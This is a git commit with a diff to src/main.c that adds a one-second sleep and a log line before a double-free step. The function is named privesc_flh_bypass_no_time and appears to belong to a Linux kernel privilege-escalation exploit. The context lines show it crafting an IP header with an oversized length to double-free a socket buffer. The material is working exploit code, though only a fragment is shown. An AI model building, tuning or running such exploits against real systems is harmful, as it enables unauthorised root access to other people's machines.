f6618f6be073e662ed5442ce84cc9a76bcbf9f08
Willenst <willenst@gmail.com>
2024-11-14 16:11:06 +0200

    1 more sleep

--- src/main.c
+++ src/main.c
@@ -333,6 +333,9 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 	PRINTF_VERBOSE("[*] double-freeing skb...\n");
 
+	printf("[*] SLEEP 1s before double free...\n");
+	sleep(1);
+
 	// cause double-free on skb from earlier
 	df_ip_header.ip_id = 0x1337;
 	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
